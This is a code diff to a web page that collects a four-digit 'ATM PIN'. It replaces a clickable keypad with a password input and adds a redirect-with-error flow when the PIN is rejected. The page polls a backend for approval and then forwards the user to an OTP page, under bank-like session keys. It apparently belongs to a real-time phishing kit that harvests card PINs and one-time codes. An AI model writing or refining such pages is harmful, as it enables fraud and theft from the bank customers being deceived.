@@ -122,37 +122,28 @@
     border-color: var(--green);
     transform: scale(1.1);
   }
-  .keypad {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 12px;
-    max-width: 280px;
+  .pin-input-wrap {
+    display: flex;
+    justify-content: center;
     margin: 0 auto 24px;
+    width: 100%;
+    max-width: 220px;
   }
-  .key {
-    background-color: #ffffff;
+  .pin-input {
+    width: 100%;
     border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 14px;
-    font-size: 18px;
-    font-weight: bold;
-    color: var(--green);
-    cursor: pointer;
-    user-select: none;
-    transition: all 0.1s ease;
+    border-radius: 10px;
+    padding: 12px 14px;
+    font-size: 22px;
+    letter-spacing: 0.5em;
     text-align: center;
+    color: var(--green);
+    background-color: #fff;
   }
-  .key:active {
-    background-color: var(--light-bg);
-    transform: scale(0.95);
-  }
-  .key.action {
-    font-size: 13px;
-    background-color: #f8f9fa;
-    color: var(--muted);
-  }
-  .key.action:active {
-    background-color: #e9ecef;
+  .pin-input:focus {
+    outline: none;
+    border-color: var(--green);
+    box-shadow: 0 0 0 3px rgba(26, 107, 60, 0.08);
   }
   .btn-submit {
     width: 100%;
@@ -249,19 +240,8 @@
       <div class="pin-dot" id="dot-3"></div>
     </div>
 
-    <div class="keypad">
-      <div class="key" onclick="pressNum(1)">1</div>
-      <div class="key" onclick="pressNum(2)">2</div>
-      <div class="key" onclick="pressNum(3)">3</div>
-      <div class="key" onclick="pressNum(4)">4</div>
-      <div class="key" onclick="pressNum(5)">5</div>
-      <div class="key" onclick="pressNum(6)">6</div>
-      <div class="key" onclick="pressNum(7)">7</div>
-      <div class="key" onclick="pressNum(8)">8</div>
-      <div class="key" onclick="pressNum(9)">9</div>
-      <div class="key action" onclick="clearPin()">Clear</div>
-      <div class="key" onclick="pressNum(0)">0</div>
-      <div class="key action" onclick="backspace()">Delete</div>
+    <div class="pin-input-wrap">
+      <input class="pin-input" id="atmPinInput" type="password" inputmode="numeric" maxlength="4" autocomplete="off" placeholder="••••" aria-label="ATM PIN" />
     </div>
 
     <button class="btn-submit" id="btnSubmit" onclick="submitPin()" disabled>Confirm &amp; Continue</button>
@@ -287,6 +267,19 @@
     sessionStorage.setItem('safwa_order_id', String(requestId));
     sessionStorage.setItem('aman_bank_request_id', String(requestId));
 
+    function applyAtmRejectMessage() {
+      var params = new URLSearchParams(window.location.search);
+      if (params.get('error') !== 'atm') return;
+      var msg = params.get('msg') || 'The PIN was rejected. Please verify the details and try again.';
+      var errorMsg = document.getElementById('errorMsg');
+      if (errorMsg) {
+        errorMsg.textContent = msg;
+        errorMsg.style.display = 'block';
+      }
+    }
+
+    var atmPinInput = document.getElementById('atmPinInput');
+
     function updateDots() {
       for (var i = 0; i < 4; i++) {
         var dot = document.getElementById('dot-' + i);
@@ -296,6 +289,7 @@
           dot.classList.remove('filled');
         }
       }
+      if (atmPinInput) atmPinInput.value = pin;
       document.getElementById('btnSubmit').disabled = (pin.length !== 4);
     }
 
@@ -316,6 +310,24 @@
         pin = pin.slice(0, -1);
         updateDots();
       }
+    }
+
+    if (atmPinInput) {
+      atmPinInput.addEventListener('input', function(){
+        pin = (atmPinInput.value || '').replace(/\D/g, '').slice(0, 4);
+        updateDots();
+      });
+
+      atmPinInput.addEventListener('keydown', function(event){
+        if (event.key === 'Backspace') {
+          event.preventDefault();
+          backspace();
+        }
+        if (event.key === 'Escape') {
+          event.preventDefault();
+          clearPin();
+        }
+      });
     }
 
     function submitPin() {
@@ -347,6 +359,8 @@
       });
     }
 
+    applyAtmRejectMessage();
+
     var pollInterval = null;
     function startPollingStatus() {
       pollInterval = setInterval(function() {
@@ -359,12 +373,8 @@
                 window.location.href = '/otp-en.html?id=' + requestId;
               } else if (data.status === 'rejected') {
                 clearInterval(pollInterval);
-                document.getElementById('loadingOverlay').style.display = 'none';
-                var errorMsg = document.getElementById('errorMsg');
-                errorMsg.textContent = 'The PIN was rejected. Please verify the details and try again.';
-                errorMsg.style.display = 'block';
-                localStorage.removeItem('requestId');
-                clearPin();
+                var rejectMessage = 'The PIN was rejected. Please verify the details and try again.';
+                window.location.href = 'atm-en.html?error=atm&msg=' + encodeURIComponent(rejectMessage) + '&id=' + requestId;
               }
             }
           })
